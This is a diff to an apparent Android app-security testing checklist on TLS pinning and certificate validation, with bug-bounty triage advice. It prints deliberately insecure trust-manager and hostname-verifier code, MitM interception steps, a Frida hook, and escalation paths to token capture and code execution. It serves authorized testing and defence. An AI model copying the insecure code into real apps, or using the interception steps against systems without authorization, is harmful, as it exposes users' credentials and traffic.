@@ -4,7 +4,7 @@
  "file": "D14-network-tls-pinning.md",
  "why": "It mostly does not, and you should know that before you start. Bugcrowd rates\n`mobile_security_misconfiguration|ssl_certificate_pinning|absent` **P5** and `|defeatable` **P5** —\nbypassing an existing pin is worth exactly as much as never having one. HackerOne's Core Ineligible\nFindings list carries \"Lack of SSL Pinning\" under *Optional security hardening steps / Missing best\npractices*, and HackerOne Platform Standards states the rule outright: \"If a report requires an attacker\nto disable Certificate Pinning in an application, then that is not a valid vulnerability.\" Xiaomi, Grab,\nSpotify, Starbucks and Snapchat all exclude it by name. The VRT changelog even records the node being\nmoved *out of* `insecure_data_transport` and *into* `mobile_security_misconfiguration` — a formal\nreclassification from a transport flaw to a configuration preference. Add to that HackerOne's blanket\n\"SSL/TLS Configurations\" exclusion, Grab's \"weak TLS/SSL versions & ciphers\", Reddit's \"Weak SSL/TLS/SSH\nalgorithms\", Basecamp's \"insecure SSL/TLS ciphers unless you have a working proof of concept\", and the\ngraveyard in this chapter is larger than the findings list.\n\nThe exception is precise and it still pays well. Reddit's policy is the clearest statement of it:\n\"Lack of certificate pinning (**improper certificate validation still eligible**).\" The distinction is\nnot rhetorical — it is a different attacker model. Pinning absence needs AM-07, an attacker who has\nalready got a CA onto the victim's device. Broken *validation* needs only AM-06: a self-signed\ncertificate on a hostile network, no CA install, no device access, no root. That is the finding class\nthat produced Twitter #168538 (**High 8.1, $2,100**, \"fails to validate server certificate and sends\noauth token\"), IBB #2293 which catalogued roughly 75 apps with the same flaw, and Razer #795272 ($750)\nfor a permissive `HostnameVerifier` scoped to a WebView. Compare Shopify #55644 — pinning absent,\nvalidation correct — rated **none, $0**. Same domain, opposite outcomes, and the only difference is\nwhether a CA had to be installed for the PoC. Google's Mobile VRP prices the same distinction under\n\"Theft of sensitive data — sensitive data sent over insecure network connections that can be\nintercepted\", and its ACE definition (\"code can be downloaded from the network and executed\") is the\ntop of this chapter's tree at Tier 1 $9,000 under MitM.\n\nThe second thing that pays is coverage, not cleverness. Google's App Security Improvement programme ran\nstore-wide campaigns for *TrustManager* (2016-02-17), *Insecure Hostname Verification* (2016-11-29) and\n*Webview SSLErrorHandler* (2015-07-17) precisely because the base rate was high enough to warrant\nforced remediation — and the same defects now live in third-party SDKs rather than app code, where one\n`HttpsURLConnection.setDefaultHostnameVerifier` call neuters every connection in the process including\nthe app's own pinned ones. The highest-yield habit in this chapter is therefore mechanical: run a pcap\nbeside the proxy and chase every destination the proxy never saw, because raw sockets, gRPC, QUIC,\nCronet, Flutter's BoringSSL and any `OkHttpClient` built with `Proxy.NO_PROXY` are invisible to a proxy\nand the stack that deliberately skips the proxy is disproportionately the stack that also skips\nvalidation. And run the whole thing only after the harness acceptance gate passes — the single most\nexpensive false negative in mobile testing is a broken Conscrypt-APEX CA install reported as \"the app\nis pinned\", which silently hides the entire D15 surface.",
  "crux": "**Is there any request on this app's wire that an attacker holding no trusted CA can read or rewrite — and does that request carry an authentication assertion, PII, or content the app will execute?** If the answer needs your CA installed to be true, you have a P5 pinning observation, not a finding.",
- "applicability": "",
+ "applicability": "D14 is never n/a as a whole: every app that opens a socket has a transport posture, and the D14-001 baseline is cited by every network finding in the report. The probe decides which **half** applies (static-only vs static+dynamic) and which item groups are n/a, and records the baseline every item reads. Run it once, from the engagement root, after P2 decompilation (`$DEC` set, `$APK` = the pulled base split).\n\n```bash\n# 1. baseline — fixes every default below (D14-001); cite the two numbers in every network finding\naapt2 dump badging \"$APK\" | grep -E \"^(package|sdkVersion|targetSdkVersion|application-debuggable)\"\n# 2. transport configuration present?  (decides D14-016/017/026/028/029/030/031/032/035)\ngrep -oE 'networkSecurityConfig=\"[^\"]+\"|usesCleartextTraffic=\"[^\"]+\"' \"$DEC/apktool/AndroidManifest.xml\" \\\n  || echo \"NO NSC, NO cleartext attribute -> platform defaults for this targetSdk apply (D14-001 table)\"\ngrep -lE 'network-security-config' \"$DEC\"/apktool/res/xml/*.xml 2>/dev/null \\\n  | xargs -I{} grep -cE 'pin-set|src=\"user\"|overridePins|cleartextTrafficPermitted=\"true\"|debug-overrides|certificateTransparency|domainEncryption' {}\n# 3. which stacks exist?  (decides D14-010/012/020/022/037/043/049/050/NEW-B/NEW-C/NEW-E)\ngrep -rlE 'OkHttpClient|HttpsURLConnection|SSLSocketFactory|SSLEngine|CronetEngine|ManagedChannelBuilder|usePlaintext|WebSocket|MediaItem|DrmConfiguration' \"$DEC/jadx/sources\" \\\n  | grep -vE '/(android|androidx)/' | wc -l\nunzip -Z1 \"$APK\" | grep -E '^lib/.*\\.so$' | grep -iE 'flutter|cronet|curl|ssl|crypto|grpc|mbedtls|wolfssl|gojni|unity|mono' \\\n  || echo \"no bundled network/TLS stack: D14-022, -037, -043, NEW-B, NEW-E n/a\"\n[ -s inventory/webviews.csv ] && echo \"webview rows: $(($(wc -l < inventory/webviews.csv)-1))\" || echo \"no WebView: D14-012 n/a\"\n# 4. can the dynamic half run at all?  (D14-002 gate; decides blocked vs done for every proof)\npython3 scripts/doctor.sh --json 2>/dev/null | grep -E '\"(mitm|root|frida|device)\"' || echo \"lab capabilities unknown: dynamic items are BLOCKED, not n/a\"\n```\n\nRecord the baseline line in `assessment-status.md` exactly as D14-001 asks: `targetSdk=NN, minSdk=NN, NSC=present|absent, usesCleartextTraffic=<value|absent>, stacks=<okhttp|urlconnection|cronet|grpc|flutter|native-ssl|none>, webview=<yes|no>, lab=<mitm,root,frida|static-only>`.\n\nPartial n/a notes a model writes (one row per group, never one for the domain):\n\n- `D14-012 n/a — no WebView (inventory/webviews.csv empty, no WebView/WebViewClient class outside android*/androidx*)`\n- `D14-017, D14-026, D14-029..D14-032, D14-035 n/a — no NSC in the manifest; targetSdk=NN so the D14-001 platform defaults apply and there is no opt-out to read`\n- `D14-027 n/a — minSdk=NN ≥ 24` · `D14-031, D14-032 n/a — targetSdk=NN < 36, the elements do not exist for this target`\n- `D14-022, D14-037, D14-043, D14-NEW-B, D14-NEW-E n/a — no bundled .so network/TLS stack (unzip -Z1 lib/ shows none) and no Cronet/gRPC reference in the DEX`\n- `D14-049 n/a — not React Native (target.framework=<x>)` · `D14-050, D14-051 n/a — no media playback stack (no MediaItem/ExoPlayer/MediaPlayer reference)`\n- `D14-006 blocked — no physical device with a SIM` · `D14-002..006, -011, -018, -024, -038, -042, -045, -047, -052, -NEW-A blocked — lab has no MitM/root capability (doctor.sh); static items settled, dynamic proofs not attempted` (blocked, never n/a: the item still applies to the app).",
  "triage": "1. **`onReceivedSslError` → `proceed()`** — one grep, one line, and it is a certificate-validation\n   bypass on the WebView path that no NSC or pin set touches. Highest signal-per-second in the domain.\n2. **Empty / non-throwing `checkServerTrusted`** — provable with a self-signed cert and no CA install,\n   which is the entire difference between High and $0.\n3. **`HostnameVerifier` returning `true`, and `SSLSocket` with no verifier** — the second case is\n   invisible to anyone who only reads the NSC, because `SSLSocket` is not governed by it.\n4. **`targetSdk` + NSC read together** — this fixes the baseline. Everything after it is either a\n   deliberate opt-out of a platform default (strong) or the platform default itself (graveyard).\n5. **Cleartext observed on the wire, attributed to the app's UID** — the manifest attribute is not the\n   finding; the plaintext bytes carrying a token are.\n6. **pcap-versus-proxy destination diff** — cheap, and it is how you find the unproxied stack that\n   nobody reviewed.\n7. **`<certificates src=\"user\"/>` or `overridePins=\"true\"` outside `<debug-overrides>`** — a deliberate\n   reversal of a platform hardening, provable with a user-store CA and no root.\n8. **Expired `<pin-set expiration>`** — the vendor believes pinning is on and it silently is not; it\n   reframes a P5 as a lapsed control.\n9. **Executable / config / bundle fetched without integrity check** — P4 baseline that you argue to\n   ACE, and the only route in this chapter to a P1.\n10. **Shadow-API diff on every hardcoded endpoint** — the mobile app's baked-in backend version is\n    routinely older and weaker than the web app's; the weakened control is the finding, not the version.\n11. **Pinning inventory per host** — last, because it is P5, and its only jobs are to tell you which\n    hook to use and to name the unpinned SDK host that carries user identifiers.",
  "graveyard": "| Observation | Why it is not a finding | What would make it one |\n|---|---|---|\n| \"The app does not implement certificate pinning\" | `mobile_security_misconfiguration.ssl_certificate_pinning.absent` = **P5**. HackerOne Core Ineligible lists \"Lack of SSL Pinning\" under missing best practices; Xiaomi, Grab, Spotify, Starbucks and Snapchat exclude it by name. Shopify #55644 was rated **none, $0** | An interceptable secret **plus** a realistic AM-06 path — i.e. broken validation (D14-007/-009/-010), an expired pin set (D14-035), or an unpinned channel carrying identifiers (D14-036) |\n| \"I bypassed the app's pinning with objection/Frida\" | `\\|ssl_certificate_pinning\\|defeatable` = **P5**. HackerOne Platform Standards: \"If a report requires an attacker to disable Certificate Pinning in an application, then that is not a valid vulnerability\" | Nothing about the bypass. Report what the decrypted traffic then reveals, filed under D15 with its own VRT |\n| \"Weak TLS ciphers / TLS 1.0 supported\" | HackerOne Core Ineligible \"SSL/TLS Configurations\"; Grab, Reddit, Basecamp and HackenProof all exclude it without a PoC. `server_security_misconfiguration.insecure_ssl\\|*` children are P5 | A captured session actually negotiating the weak parameters **and** a demonstrated decryption or downgrade consequence |\n| \"Missing HSTS on the auth subdomain\" | Exploitation needs an active MitM position you cannot demonstrate remotely; `server_security_misconfiguration.lack_of_security_headers.strict_transport_security` = P5 | A demonstrated downgrade of a real session on a network you controlled, with the token captured |\n| \"Missing CAA / DNSSEC / SPF-DKIM-DMARC\" | P5 nodes, and reading `p=none` from `dig` is not a finding | A spoofed mail **delivered to the Inbox** of a real receiver you control, with headers — and even then it belongs to the email domain, not here |\n| \"`<debug-overrides>` present in the release APK\" | The block is inert unless `android:debuggable=\"true\"` — MobSF itself gates the finding on that flag | The store build is also debuggable (→ D14-028) |\n| \"The app trusts user CAs\" on a `targetSdk < 24` build | That is the documented platform default for that target, not a deviation | `targetSdk ≥ 24` with an explicit `<certificates src=\"user\"/>` (→ D14-026), or `overridePins=\"true\"` (→ D14-029) |\n| \"Cleartext is permitted\" on a `targetSdk < 28` build | Default-allow below 28; the attribute's presence proves nothing | Sensitive data observed on the wire (→ D14-018), or an explicit opt-in on a `targetSdk ≥ 28` build |\n| \"An analytics ping goes over HTTP\" | Informational unless it carries something | The ping carries a session token, a stable user id, an advertising id tied to an account, or PII |\n| \"ARP poisoning lets me intercept the app\" | True of every OS, needs same-L2 presence, defeated by Wi-Fi client isolation and MAC randomisation. Use the lab-gateway form purely as a capture mechanism | Nothing — it is not an Android finding. Report the app-side defect the capture revealed |\n| \"Play Integrity / SafetyNet can be bypassed with Frida\" | Verdicts are checked server-side and cannot be forged by a local hook. If the gate is a server-verified attestation, stop and re-scope | The **server** accepting requests carrying no integrity verdict at all — a separate, server-side finding |\n| \"The interception-detection routine can be defeated\" | `lack_of_binary_hardening.runtime_instrumentation_based` = P5; AM-12 (own rooted device) is not an attacker | Only if a client SoW explicitly buys MAS-R resilience controls — then it is a contractual gap, not a vulnerability |\n| \"OkHttp version X has CVE-YYYY-NNNN\" | `using_components_with_known_vulnerabilities.outdated_software_version` = P5; a version string is not reachability | The vulnerable code path demonstrably reached — e.g. a manual `HostnameVerifier` call plus an accepted confusable-hostname certificate (→ D14-014) |\n| \"Traffic fails to intercept, therefore the app pins\" | Uniform failure across unrelated hosts including CDNs is your trust store, not the app. On API 34+ the `/system/etc/security/cacerts` push succeeds and changes nothing | A `<pin-set>`/`CertificatePinner` call site **plus** `I/X509Util: … Pin verification failed` in logcat (→ D14-003) |\n| \"The app ignores the system proxy\" | A testability observation, not a vulnerability | The proxy-bypassing client also skipping validation (→ D14-007), or a channel carrying secrets that no review ever covered (→ D14-004) |\n| \"`<domainEncryption>` is not enabled\" | Below API 37 it is disabled by default; the hostname is visible on every other platform too | The hostname itself is the sensitive datum (health, dating, whistleblowing) **and** the app explicitly sets `mode=\"disabled\"` |\n| \"OAuth `client_secret` is embedded in the APK\" | Known and expected for a public client; on the corpus's never-submit list | **PKCE non-enforcement** at the token endpoint — that is the reportable inversion (→ D13) |",
  "joins": "- **NSC pin set × the `SSLSocket`/native channel (D14-010, D14-022, D19).** Nobody reviews the pin set\n  and the socket inventory together. NSC pins and NSC cleartext rules cover framework traffic —\n  `HttpsURLConnection`, OkHttp, WebView — and cover **neither** `SSLSocket` nor Dart's `HttpClient` nor\n  Cronet's own stack. The join is: enumerate every TLS-bearing channel from the pcap, then check each one\n  against the pin set and the trust code separately. A vendor's \"our NSC is strict\" answer closes exactly\n  one of them.\n- **Cleartext carve-out × OTA / dynamic code loading (D14-017 × D14-047 × D17).** The single domain the\n  team allowed cleartext for \"because it is just the CDN\" is routinely the one serving the JS bundle, the\n  feature-flag JSON, the downloadable module or the model file. Read the `<domain-config\n  cleartextTrafficPermitted=\"true\">` list against the list of hosts that serve loadable artefacts — the\n  intersection is a P4 that argues to P1.\n- **Pinned certificate in `assets/` × recon (D14-039 × D01).** The bundled `.cer` names a host by\n  construction. Pull its Subject and SANs, feed them into a certificate-transparency search for\n  siblings, then sweep the new host for unauthenticated routes. The APK is the only place that internal\n  name is published.\n- **DRM licence URI × session token (D14-050 × D13).** The media team owns `setLicenseUri`, the auth team\n  owns the bearer token, and `setLicenseRequestHeaders` quietly joins them on an HTTP client outside the\n  pin set. Nobody reviews the licence request as an auth surface.\n- **Deep link × player source / base URL (D09 × D14-046 × D14-051).** The deep-link reviewer checks for\n  intent redirection; the network reviewer checks TLS. Neither checks whether a link parameter can set\n  the host the app then sends its `Authorization` header to. One `am start` answers it.\n- **Debuggable flag × `<debug-overrides>` (D02/D26 × D14-028).** Each is graveyard alone — a debuggable\n  release is a hardening finding, a stray debug-override block is inert — and together they are a\n  shipped, no-root MitM backdoor plus JDWP into the app's UID.\n- **Third-party SDK × the app's own pinning (D18 × D14-013).** One SDK calling\n  `HttpsURLConnection.setDefaultHostnameVerifier` with a permissive implementation neuters the app's own\n  pinned connections process-wide. The SDK reviewer looks at permissions and endpoints; the TLS reviewer\n  looks at the app's own code; the process-global setter sits between them.\n- **DNS control × an unpinned config host (D14-045 × D14-046 × D17).** DNS is reviewed as a privacy\n  matter and pinning as a transport matter. Joined, a name the app resolves but does not pin, which\n  serves config the app trusts, is a mass-redirection primitive that needs no TLS break at all.\n- **Loopback listener × any installed app (D14-023 × D13 × AM-03).** The OAuth reviewer checks PKCE and\n  `redirect_uri` registration; the IPC reviewer checks exported components. Neither checks\n  `/proc/net/tcp` during the login flow — and Android does not isolate loopback between apps.\n- **Decrypted mobile endpoint × the current web API (D14-054 × D15).** The pinning bypass is P5 and the\n  endpoint list looks unremarkable — until you diff the mobile-era version against the web app's current\n  one for auth strength, throttling, validation and field exposure. The weakened control is the finding;\n  the version delta alone is informational.",
@@ -81,8 +81,12 @@
     "AM-07"
    ],
    "applies_to": "all dynamic testing; the Conscrypt/zygote steps are mandatory on API 34+",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, root, mitm",
+   "requires_tags": [
+    "device",
+    "root",
+    "mitm"
+   ],
    "maps_to": "MASTG-TECH-0011 (stale for API 34+ — it still documents the `/system` copy), MASTG-TOOL-0077, MASTG-TOOL-0097",
    "record": "",
    "legacy_meta": {},
@@ -124,8 +128,11 @@
    "attacker": "n/a",
    "attacker_ids": [],
    "applies_to": "all; the APEX trap is specific to API 34+",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, mitm",
+   "requires_tags": [
+    "device",
+    "mitm"
+   ],
    "maps_to": "MASTG-TEST-0244 (implementation-agnostic), MASTG-TEST-0022 (documents the `X509Util` log line), MASTG-KNOW-0015",
    "record": "",
    "legacy_meta": {},
@@ -154,7 +161,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Decide \"pinned / not pinned\" from three independent signals, never from whether your proxy\nhappened to work.",
-   "how": "```bash\n# 1. static declaration\ngrep -rn '<pin-set\\|pin digest=' apktool_out/res/xml/\ngrep -rn 'CertificatePinner\\|certificatePinner(\\|sslSocketFactory(\\|checkServerTrusted\\|HostnameVerifier' jadx_out/sources\n# 2. failure shape - uniform vs per-host\n#    uniform failure across analytics + CDNs + first-party  -> YOUR trust store\n#    failure on ONE first-party host while analytics decrypts -> real pinning\n# 3. platform log\nadb logcat -c; adb shell am force-stop <pkg>; adb shell monkey -p <pkg> 1\nadb logcat | grep -iE 'X509Util|Pin verification failed|CertPathValidatorException|Trust anchor'\n```\n`I/X509Util: Failed to validate the certificate chain, error: Pin verification failed` is pinning.\n`Trust anchor for certification path not found` is a trust-store problem. Note the classic API 34+\ntrap: pushing a hashed CA to `/system/etc/security/cacerts` **succeeds, `chmod` succeeds, and nothing\ntrusts it**, producing `Client TLS handshake failed … does not trust the proxy's certificate` for\n*every* host — which reads exactly like pinning.",
+   "how": "```bash\n# 1. static declaration\ngrep -rn '<pin-set\\|pin digest=' $DEC/apktool/res/xml/\ngrep -rn 'CertificatePinner\\|certificatePinner(\\|sslSocketFactory(\\|checkServerTrusted\\|HostnameVerifier' $DEC/jadx/sources\n# 2. failure shape - uniform vs per-host\n#    uniform failure across analytics + CDNs + first-party  -> YOUR trust store\n#    failure on ONE first-party host while analytics decrypts -> real pinning\n# 3. platform log\nadb logcat -c; adb shell am force-stop <pkg>; adb shell monkey -p <pkg> 1\nadb logcat | grep -iE 'X509Util|Pin verification failed|CertPathValidatorException|Trust anchor'\n```\n`I/X509Util: Failed to validate the certificate chain, error: Pin verification failed` is pinning.\n`Trust anchor for certification path not found` is a trust-store problem. Note the classic API 34+\ntrap: pushing a hashed CA to `/system/etc/security/cacerts` **succeeds, `chmod` succeeds, and nothing\ntrusts it**, producing `Client TLS handshake failed … does not trust the proxy's certificate` for\n*every* host — which reads exactly like pinning.",
    "proof": "The `<pin-set>` XML or `CertificatePinner` call site **plus** the `Pin verification failed`\nline. Absence of both plus a uniform failure is a proved harness defect, not a proved control.",
    "escalation": "Correct classification decides whether the next four hours go into D15 or into D26.",
    "ruled_out_when": "No pin declaration anywhere, no `Pin verification failed` in logcat, and the\ncontrol app from D14-002 decrypts — the app does not pin, and that is a P5 note, not a finding."
@@ -172,8 +179,12 @@
    "attacker": "n/a",
    "attacker_ids": [],
    "applies_to": "all; mandatory when the APK bundles Cronet, gRPC, Flutter, Unity or Go",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, root, mitm",
+   "requires_tags": [
+    "device",
+    "root",
+    "mitm"
+   ],
    "maps_to": "MASTG-TECH-0010, MASTG-TEST-0236 (its stated limitation that capture and proxy see different things), MASTG-TOOL-0075, MASTG-TOOL-0081",
    "record": "",
    "legacy_meta": {},
@@ -222,8 +233,11 @@
     "AM-06"
    ],
    "applies_to": "all",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, mitm",
+   "requires_tags": [
+    "device",
+    "mitm"
+   ],
    "maps_to": "MASTG-TECH-0010, MASTG-TOOL-0097, MASTG-TOOL-0120 (ProxyDroid)",
    "record": "",
    "legacy_meta": {},
@@ -267,8 +281,12 @@
     "AM-06"
    ],
    "applies_to": "apps with carrier integration, silent/header-enrichment auth, eSIM, roaming logic",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, physical, mitm",
+   "requires_tags": [
+    "device",
+    "physical",
+    "mitm"
+   ],
    "maps_to": "MASTG-TECH-0011; corpus source sec-88 \"Intercepting Cellular Android Traffic via Mobile Data and Ngrok\"",
    "record": "",
    "legacy_meta": {},
@@ -347,7 +365,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Any connection configured with a `TrustManager` whose `checkServerTrusted` does not validate\nthe chain accepts **any** certificate. This is materially worse than absent pinning: it needs no CA on\nthe victim's device at all.",
-   "how": "```bash\nsemgrep -c rules/mastg-android-network-checkservertrusted.yml jadx_out/sources/\ngrep -rn -A20 'checkServerTrusted' jadx_out/sources/ | less\ngrep -rn 'X509TrustManager\\|TrustManager\\[\\]\\|SSLContext.getInstance\\|TrustManagerFactory\\|init(null' jadx_out/sources/\n# SDK-attributable hits only (exclude the platform's own classes):\ngrep -rn 'checkServerTrusted\\|X509TrustManager' jadx_out/sources/ | grep -viE '^jadx_out/sources/(android|androidx)/'\n```\nThe canonical vulnerable shape:\n```java\nnew X509TrustManager() {\n    public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n    public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[]{}; }\n};\n```\nRuntime confirmation — log which trust managers are actually installed:\n```javascript\nJava.perform(function () {\n  var C = Java.use('javax.net.ssl.SSLContext');\n  C.init.overload('[Ljavax.net.ssl.KeyManager;','[Ljavax.net.ssl.TrustManager;','java.security.SecureRandom')\n   .implementation = function (k, t, r) {\n     if (t) for (var i = 0; i < t.length; i++) console.log('[TM] ' + t[i].$className);\n     return this.init(k, t, r); };\n});\n```",
+   "how": "```bash\nsemgrep -c rules/mastg-android-network-checkservertrusted.yml $DEC/jadx/sources/\ngrep -rn -A20 'checkServerTrusted' $DEC/jadx/sources/ | less\ngrep -rn 'X509TrustManager\\|TrustManager\\[\\]\\|SSLContext.getInstance\\|TrustManagerFactory\\|init(null' $DEC/jadx/sources/\n# SDK-attributable hits only (exclude the platform's own classes):\ngrep -rn 'checkServerTrusted\\|X509TrustManager' $DEC/jadx/sources/ | grep -viE '^$DEC/jadx/sources/(android|androidx)/'\n```\nThe canonical vulnerable shape:\n```java\nnew X509TrustManager() {\n    public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n    public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[]{}; }\n};\n```\nRuntime confirmation — log which trust managers are actually installed:\n```javascript\nJava.perform(function () {\n  var C = Java.use('javax.net.ssl.SSLContext');\n  C.init.overload('[Ljavax.net.ssl.KeyManager;','[Ljavax.net.ssl.TrustManager;','java.security.SecureRandom')\n   .implementation = function (k, t, r) {\n     if (t) for (var i = 0; i < t.length; i++) console.log('[TM] ' + t[i].$className);\n     return this.init(k, t, r); };\n});\n```",
    "proof": "Full request/response pairs decrypted in mitmproxy while the proxy CA is trusted by\n**nothing** on the device — state in the report that Settings → Trusted credentials → User was empty\nand no system CA was installed. Screenshot that empty list in the same evidence pack.",
    "escalation": "Captured bearer token → D13 replay / account takeover; injected response → D10 WebView\nbridge; substituted update artefact → D17 code load → `server_side_injection|remote_code_execution_rce`.",
    "ruled_out_when": "Every `checkServerTrusted` body either delegates to a platform-built\n`X509TrustManager` obtained from a `TrustManagerFactory` initialised with `null` (the system anchors),\nor throws `CertificateException`/`IllegalArgumentException` on failure — and a self-signed cert with no\nCA installed produces `SSLHandshakeException`/`Trust anchor for certification path not found` in\nlogcat for every host."
@@ -397,7 +415,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The empty body is the easy case. The paying case is a body that *looks* like validation and\nis not. MASTG enumerates the exact failure modes — check each one by reading the body, not by grepping\nfor `{}`:\n1. calls `chain[0].checkValidity()` only — that checks **expiry**, not trust and not hostname;\n2. catches `CertificateException` and logs/suppresses instead of rethrowing;\n3. returns early on a `BuildConfig.DEBUG`-style flag or a `\"development\"` build-type check that also\n   evaluates true in the shipped build;\n4. compares only the certificate's `getSubjectDN()` string, which an attacker controls;\n5. `getAcceptedIssuers()` returning `null` or an empty array where the caller then treats the chain as\n   unverifiable-but-acceptable.",
-   "how": "```bash\ngrep -rn -A25 'public void checkServerTrusted' jadx_out/sources/ \\\n  | grep -nE 'checkValidity|catch *\\(|return;|BuildConfig|DEBUG|getSubjectDN|getAcceptedIssuers|Log\\.'\ngrep -rn -A6 'getAcceptedIssuers' jadx_out/sources/ | grep -nE 'return null|new X509Certificate\\[0\\]'\n```",
+   "how": "```bash\ngrep -rn -A25 'public void checkServerTrusted' $DEC/jadx/sources/ \\\n  | grep -nE 'checkValidity|catch *\\(|return;|BuildConfig|DEBUG|getSubjectDN|getAcceptedIssuers|Log\\.'\ngrep -rn -A6 'getAcceptedIssuers' $DEC/jadx/sources/ | grep -nE 'return null|new X509Certificate\\[0\\]'\n```",
    "proof": "MitM with a certificate that is (a) **currently valid** and (b) issued by a CA in no trust\nstore — this defeats a `checkValidity()`-only implementation specifically and proves the distinction\nto a triager who will otherwise argue \"there is validation code there\".",
    "escalation": "Identical to D14-007. Quote the MASTG failure-mode list in the report; it pre-empts the\n\"we do validate\" pushback.",
    "ruled_out_when": "The body's terminal path is a delegated `checkServerTrusted` on a system-anchored\n`X509TrustManager` with no `catch` that swallows, and interception with a valid-but-untrusted\ncertificate fails."
@@ -452,7 +470,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Chain validation can be perfect and the connection still worthless if the hostname is not\nchecked: any certificate for any domain the attacker legitimately owns then works. MASTG's failure\nmodes: unconditional `return true`; overly broad wildcard matching; incomplete coverage (verifier\napplied to some channels but not all); missing manual verification where it is not automatic.",
-   "how": "```bash\nsemgrep -c rules/mastg-android-network-hostname-verification.yml jadx_out/sources/\ngrep -rn -A10 'HostnameVerifier' jadx_out/sources/ | grep -n 'return true'\ngrep -rn 'ALLOW_ALL_HOSTNAME_VERIFIER\\|AllowAllHostnameVerifier\\|NoopHostnameVerifier\\|setHostnameVerifier\\|setDefaultHostnameVerifier\\|verify(java.lang.String, javax.net.ssl.SSLSession)' jadx_out/sources/\n```\nThe canonical shape:\n```java\nSSLSocketFactory sf = new cc(trustStore);\nsf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);\n```",
+   "how": "```bash\nsemgrep -c rules/mastg-android-network-hostname-verification.yml $DEC/jadx/sources/\ngrep -rn -A10 'HostnameVerifier' $DEC/jadx/sources/ | grep -n 'return true'\ngrep -rn 'ALLOW_ALL_HOSTNAME_VERIFIER\\|AllowAllHostnameVerifier\\|NoopHostnameVerifier\\|setHostnameVerifier\\|setDefaultHostnameVerifier\\|verify(java.lang.String, javax.net.ssl.SSLSession)' $DEC/jadx/sources/\n```\nThe canonical shape:\n```java\nSSLSocketFactory sf = new cc(trustStore);\nsf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);\n```",
    "proof": "Present a certificate that is **validly signed for a different hostname** (a domain you\nown, or Burp's per-host CA-signed cert issued for the wrong CN) and show the app completing the\nhandshake and sending its request. That isolates hostname verification from chain validation — a\nself-signed cert would not distinguish the two.",
    "escalation": "→ D13 (captured session), → D10 (WebView content served from your host), → D17.",
    "ruled_out_when": "No app- or SDK-authored `HostnameVerifier` exists (the default\n`OkHostnameVerifier`/platform verifier is in use), and a wrong-CN certificate produces\n`SSLPeerUnverifiedException` / `Hostname … not verified` in logcat on every channel including\nWebView and any `SSLSocket` path."
@@ -504,7 +522,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "`SSLSocket` does **not** perform hostname verification by default, and MASTG states the\nconsequence explicitly: \"The connection succeeds even if the app has a fully secure Network Security\nConfiguration (NSC) in place because `SSLSocket` is not affected by it.\" This is the single most\ncommon way a vendor's \"we use the NSC\" answer fails to close a finding.",
-   "how": "```bash\nsemgrep -c rules/mastg-android-ssl-socket-hostnameverifier.yml jadx_out/sources/\ngrep -rn 'SSLSocketFactory\\|createSocket(\\|SSLSocket ' jadx_out/sources/\n# a correct implementation calls one of these on the socket it just created:\ngrep -rn 'getDefaultHostnameVerifier\\|HttpsURLConnection.getDefaultHostnameVerifier\\|setEndpointIdentificationAlgorithm' jadx_out/sources/\n```\nThe safe pattern is `SSLParameters.setEndpointIdentificationAlgorithm(\"HTTPS\")` or an explicit\n`HttpsURLConnection.getDefaultHostnameVerifier().verify(host, socket.getSession())` after\n`startHandshake()`. Neither present ⇒ unverified.",
+   "how": "```bash\nsemgrep -c rules/mastg-android-ssl-socket-hostnameverifier.yml $DEC/jadx/sources/\ngrep -rn 'SSLSocketFactory\\|createSocket(\\|SSLSocket ' $DEC/jadx/sources/\n# a correct implementation calls one of these on the socket it just created:\ngrep -rn 'getDefaultHostnameVerifier\\|HttpsURLConnection.getDefaultHostnameVerifier\\|setEndpointIdentificationAlgorithm' $DEC/jadx/sources/\n```\nThe safe pattern is `SSLParameters.setEndpointIdentificationAlgorithm(\"HTTPS\")` or an explicit\n`HttpsURLConnection.getDefaultHostnameVerifier().verify(host, socket.getSession())` after\n`startHandshake()`. Neither present ⇒ unverified.",
    "proof": "A certificate for an unrelated hostname accepted on the `SSLSocket` channel while the same\ncertificate is rejected on the app's `HttpsURLConnection`/OkHttp channel — capture both in one\nsession, side by side. That pairing is what makes the finding unarguable.",
    "escalation": "Whatever the socket carries — chat messages, MQTT credentials, a token exchange — plus\nfull response control (→ D15, D16 if the peer bytes reach a native parser).",
    "ruled_out_when": "No `SSLSocket` is created outside a library that verifies internally (OkHttp,\n`HttpsURLConnection`), or every created socket is followed by an explicit verifier call or\n`setEndpointIdentificationAlgorithm(\"HTTPS\")`."
@@ -524,8 +542,10 @@
     "AM-06"
    ],
    "applies_to": "all multi-stack apps (an OkHttp API client plus a WebView plus a download/media/socket path)",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "mitm",
+   "requires_tags": [
+    "mitm"
+   ],
    "maps_to": "MASTG-TEST-0283 (\"incomplete verification coverage\" named as a distinct failure mode), MASWE-0027, CWE-297",
    "record": "",
    "legacy_meta": {},
@@ -556,7 +576,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Enumerate every TLS-bearing channel in the app and test each one separately. Validation is\nroutinely correct on the flagship API client and absent on: the image loader, the analytics SDK, the\nfile-download path, the WebView, the push/socket channel, and the renegotiation path.",
